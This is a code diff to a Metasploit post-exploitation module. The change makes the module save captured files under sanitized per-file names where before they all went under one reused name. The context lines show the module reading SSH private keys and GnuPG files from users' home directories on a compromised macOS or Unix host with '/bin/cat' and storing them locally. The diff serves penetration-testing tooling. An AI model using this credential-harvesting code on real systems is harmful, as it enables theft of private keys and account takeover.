@@ -213,7 +213,7 @@ class MetasploitModule < Msf::Post
             ssh_file_content = cmd_exec("/bin/cat ~/.ssh/#{k}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{name}",ssh_file_content)
+            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
           end
         end
 
@@ -227,7 +227,7 @@ class MetasploitModule < Msf::Post
             gpg_file_content = cmd_exec("/bin/cat ~/.gnupg/#{k.strip}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{name}", gpg_file_content)
+            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}", gpg_file_content)
           end
         end
       else
@@ -249,7 +249,7 @@ class MetasploitModule < Msf::Post
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{name}",ssh_file_content)
+              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
             end
           end
         end
@@ -266,7 +266,7 @@ class MetasploitModule < Msf::Post
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{name}",ssh_file_content)
+              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
             end
           end
         end
